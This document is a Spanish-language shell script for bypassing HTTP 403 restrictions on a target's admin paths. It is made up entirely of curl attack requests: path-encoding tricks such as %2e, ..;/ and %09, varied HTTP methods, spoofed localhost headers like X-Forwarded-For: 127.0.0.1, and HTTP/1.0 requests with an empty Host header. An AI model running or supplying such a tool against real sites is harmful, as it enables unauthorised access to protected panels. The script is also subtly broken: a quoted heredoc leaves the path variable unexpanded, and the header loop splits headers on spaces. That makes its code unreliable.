#!/bin/sh
# 403-bypass-show-params.sh
# Muestra URL completa + método + cabeceras usadas en cada prueba
#
# Uso:  ./403-bypass-show-params.sh https://hackingyseguridad.com /admin/
#       ./403-bypass-show-params.sh https://ejemplo.com /panel

if [ $# -lt 2 ]; then
    echo "Uso: $0 <base_url> <path>"
    echo "Ejemplos:"
    echo "  $0 https://hackingyseguridad.com /admin/"
    echo "  $0 https://target.com admin"
    exit 1
fi

BASEURL="$1"
PATH_INPUT="$2"

# Limpiamos el path (quitamos / inicial y final)
PATH_INPUT="${PATH_INPUT#/}"
PATH_INPUT="${PATH_INPUT%/}"
TARGET_PATH="$PATH_INPUT"

echo ""
echo "============================================================="
echo " Pruebas de bypass 403 → ${BASEURL}/${TARGET_PATH}/"
echo "============================================================="
echo ""

# ────────────────────────────────────────────────
#  Payloads de path (relativos)
# ────────────────────────────────────────────────

payloads() {
    cat << 'EOF'
${TARGET_PATH}/
${TARGET_PATH}//
${TARGET_PATH}/.
${TARGET_PATH}/../${TARGET_PATH}/
${TARGET_PATH}/%2e/
${TARGET_PATH}/%2e%2e/${TARGET_PATH}/
${TARGET_PATH}/.;/
${TARGET_PATH}/..;/
${TARGET_PATH}%20/
${TARGET_PATH}%09/
${TARGET_PATH}?
${TARGET_PATH}%3f
${TARGET_PATH}%23
${TARGET_PATH}/*
${TARGET_PATH}/.random
${TARGET_PATH}/index.aspx
${TARGET_PATH}/default.aspx
EOF
}

# ────────────────────────────────────────────────
#  Métodos HTTP a probar
# ────────────────────────────────────────────────
METHODS="GET HEAD OPTIONS POST"

# ────────────────────────────────────────────────
#  Cabeceras especiales (una por línea)
# ────────────────────────────────────────────────
special_headers() {
    cat << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-For: ::1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: localhost
Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1;proto=https;by=localhost
EOF
}

# ────────────────────────────────────────────────
#  1. Pruebas variando path + método (sin cabeceras extra)
# ────────────────────────────────────────────────

echo "[*] 1. Variaciones de PATH + cambio de método (sin cabeceras especiales)"
echo "-------------------------------------------------------------"

for payload in $(payloads); do
    full_url="${BASEURL}/${payload}"
    for method in $METHODS; do
        echo "URL     : $full_url"
        echo "Método  : $method"
        echo "Headers : (ninguno especial)"
        echo "--------------------------------------------------"
        curl -sk -m 7 -I -X "$method" "$full_url" 2>/dev/null | head -n 1
        echo ""
    done
done

# ────────────────────────────────────────────────
#  2. Pruebas con cabeceras de proxy/localhost (solo GET)
# ────────────────────────────────────────────────

echo "[*] 2. Cabeceras de proxy / localhost spoofing (solo GET)"
echo "-------------------------------------------------------------"

for header in $(special_headers); do
    for extra in "" "//" "/." "/..;/" "/.;/"; do
        full_url="${BASEURL}/${TARGET_PATH}${extra}"
        echo "URL     : $full_url"
        echo "Método  : GET"
        echo "Header  : $header"
        echo "--------------------------------------------------"
        curl -sk -m 7 -I -X GET -H "$header" "$full_url" 2>/dev/null | head -n 1
        echo ""
    done
done

# ────────────────────────────────────────────────
#  3. Trucos de HTTP/1.0 + Host vacío (clásicos en IIS antiguos)
# ────────────────────────────────────────────────

echo "[*] 3. Trucos HTTP/1.0 + Host header vacío"
echo "-------------------------------------------------------------"

full_url="${BASEURL}/${TARGET_PATH}/"

echo "URL     : $full_url"
echo "Método  : GET"
echo "Versión : HTTP/1.0  (sin --http1.0 explícito)"
echo "Headers : (ninguno especial)"
echo "--------------------------------------------------"
curl -sk -m 7 -I "$full_url" 2>/dev/null | head -n 1
echo ""

echo "URL     : $full_url"
echo "Método  : GET"
echo "Versión : HTTP/1.0"
echo "Headers : Host: (vacío)"
echo "--------------------------------------------------"
curl -sk -m 7 -I --http1.0 -H "Host:" "$full_url" 2>/dev/null | head -n 1
echo ""

echo ""
echo "============================================================="
echo " Finalizadas las pruebas básicas"
echo " Busca respuestas 200 / 301 / 302 / 401 / 403 con cuerpos distintos"
echo " Si ves algo interesante → repite manualmente con Burp / navegador"
echo "============================================================="
echo ""
